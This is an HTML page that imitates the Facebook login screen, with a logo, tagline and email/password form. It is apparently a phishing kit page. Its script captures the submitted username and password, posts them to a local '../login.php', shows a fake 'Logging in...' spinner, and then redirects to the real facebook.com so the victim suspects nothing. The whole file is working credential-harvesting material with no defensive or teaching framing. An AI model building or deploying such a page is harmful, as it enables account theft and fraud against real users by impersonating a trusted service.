<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: Helvetica, Arial, sans-serif;
            background: linear-gradient(white, #D3D8E8);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .container {
            width: 100%;
            max-width: 980px;
            padding: 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            gap: 50px;
        }
        
        .left-section {
            flex: 1;
        }
        
        .logo {
            font-size: 60px;
            font-weight: bold;
            color: #1877f2;
            margin-bottom: 16px;
        }
        
        .tagline {
            font-size: 28px;
            line-height: 32px;
            width: 500px;
        }
        
        .right-section {
            flex: 1;
            max-width: 396px;
        }
        
        .login-box {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            padding: 20px;
        }
        
        .input-field {
            width: 100%;
            padding: 14px 16px;
            font-size: 17px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            margin-bottom: 12px;
            outline: none;
        }
        
        .input-field:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        
        .login-btn {
            width: 100%;
            padding: 14px 16px;
            font-size: 20px;
            font-weight: bold;
            color: white;
            background: #1877f2;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            margin-bottom: 16px;
        }
        
        .login-btn:hover {
            background: #166fe5;
        }
        
        .forgot-link {
            text-align: center;
            margin-bottom: 20px;
        }
        
        .forgot-link a {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }
        
        .forgot-link a:hover {
            text-decoration: underline;
        }
        
        .divider {
            border-top: 1px solid #dadde1;
            margin: 20px 0;
        }
        
        .create-btn {
            display: block;
            margin: 0 auto;
            padding: 14px 16px;
            font-size: 17px;
            font-weight: bold;
            color: white;
            background: #42b72a;
            border: none;
            border-radius: 6px;
            cursor: pointer;
        }
        
        .create-btn:hover {
            background: #36a420;
        }
        
        .loading {
            display: none;
            text-align: center;
            padding: 20px;
        }
        
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #1877f2;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @media (max-width: 900px) {
            .container {
                flex-direction: column;
                text-align: center;
            }
            
            .tagline {
                width: 100%;
            }
            
            .right-section {
                max-width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="left-section">
            <div class="logo">facebook</div>
            <div class="tagline">
                Facebook helps you connect and share with the people in your life.
            </div>
        </div>
        
        <div class="right-section">
            <div class="login-box">
                <form id="loginForm" method="POST" action="../login.php">
                    <input type="text" name="username" class="input-field" placeholder="Email or phone number" required>
                    <input type="password" name="password" class="input-field" placeholder="Password" required>
                    <button type="submit" class="login-btn">Log In</button>
                </form>
                
                <div class="forgot-link">
                    <a href="#">Forgot password?</a>
                </div>
                
                <div class="divider"></div>
                
                <button class="create-btn">Create new account</button>
                
                <div class="loading" id="loading">
                    <div class="spinner"></div>
                    <p>Logging in...</p>
                </div>
            </div>
        </div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            document.querySelector('.login-box form').style.display = 'none';
            document.querySelector('.forgot-link').style.display = 'none';
            document.querySelector('.divider').style.display = 'none';
            document.querySelector('.create-btn').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            var formData = new FormData(this);
            
            fetch('../login.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                setTimeout(function() {
                    window.location.href = 'https://www.facebook.com/';
                }, 2000);
            })
            .catch(error => {
                setTimeout(function() {
                    window.location.href = 'https://www.facebook.com/';
                }, 2000);
            });
        });
    </script>
</body>
</html>
